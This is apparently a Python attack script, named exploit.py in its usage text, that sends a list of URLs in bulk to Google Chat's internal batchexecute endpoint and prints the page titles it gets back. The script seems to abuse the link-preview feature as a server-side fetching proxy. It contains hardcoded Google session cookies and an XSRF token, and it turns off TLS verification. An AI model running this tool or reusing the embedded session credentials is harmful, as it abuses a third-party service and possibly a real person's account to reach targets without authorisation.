import requests, optparse, json, multiprocessing
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def menu():
    parser = optparse.OptionParser()
    parser.add_option('-l','--list',dest='http_url_list',help='urls.txt')
    parser.add_option('-t', '--threads', dest="threads", type=int,default=10)

    options,args = parser.parse_args()
    
    if not options.http_url_list:
        print('[+] Specify a file')
        print('[+] Example usage: exploit.py -l urls.txt -t 100')
        exit()
    globals().update(locals())

def fire(url):
    google_host='https://chat.google.com/u/0/_/DynamiteWebUi/data/batchexecute'
    google_headers={
        "Connection": "close",
        "Content-Type": "application/x-www-form-urlencoded"
        }
    google_cookies={
        "OSID":"FAgwSJQ3OlMgXakeAL9ipBaXHia4rFPVt-TwD_eODmJx6YJi1x7Ezvo85sLmh60cvddnkg.",
        "SID":"FggwSBI3QoHUMP_XxpOP0VxezAH4Oo5WUiG-w7iavNnrYnlb5pzSRrhZP_tRddflPoze6Q.",
        "__Secure-1PSID":"FggwSBI3QoHUMP_XxpOP0VxezAH4Oo5WUiG-w7iavNnrYnlbPhHE-7619R_cX1q9IO449w.",
        "__Secure-3PSID":"FggwSBI3QoHUMP_XxpOP0VxezAH4Oo5WUiG-w7iavNnrYnlbkxkWza_x2e_f1c9c6q1JCA."
        }
    payload='f.req=%5B%5B%5B%22xok6wd%22%2C%22%5B%5C%22{}%5C%22%2C%5B%5D%2C%5B%5C%22dm%2FgLnz9oAAAAE%5C%22%2C%5C%22gLnz9oAAAAE%5C%22%2C5%5D%2C%5B%5C%22%5C%22%5D%2Cnull%2Ctrue%2Ctrue%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at=AM9aX1HSQPZ15c4a8g3iMWFCzOaB%3A1642134764385&'.format(url)
    
    try:
        r = requests.post(google_host,data=payload,cookies=google_cookies,headers=google_headers,verify=False,timeout=4)
    except requests.Timeout as e:
        pass
    title = r.text.replace("[[","\n").splitlines()[4].split(',')[6][1:].strip('\"\\\/')
    if title != "null" and title != "af.httprm":
        print("[{}] {}".format(url,title))

def main():
    menu()

    parallelism = multiprocessing.Pool(options.threads)
    filled_with_urls = open(options.http_url_list)
    urls = map(str.strip, filled_with_urls.readlines())

    try:
        parallelism.map(fire, urls)
        parallelism.close()
        parallelism.join()
    except UnboundLocalError:
        pass
    except KeyboardInterrupt:
        sys.exit(0)

if __name__ == "__main__":
    main()
